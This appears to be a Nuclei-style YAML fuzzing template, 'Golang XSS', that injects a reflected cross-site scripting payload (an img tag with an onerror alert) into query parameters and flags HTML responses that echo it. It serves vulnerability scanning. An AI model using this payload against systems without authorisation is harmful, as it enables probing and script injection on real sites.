http:
- fuzzing:
  - fuzz:
    - '{{xss}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    type: word
    words:
    - <img src=x onerror=alert()>slon</img>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    xss:
    - <a/href/='https://google.com/#><img src=x onerror=alert()>slon</img></h1>'>google</a>
  stop-at-first-match: true
id: golang-xss
info:
  author: reewardius
  name: Golang XSS
  severity: medium
  tags: fuzzing-xss,fuzzing-req,dast
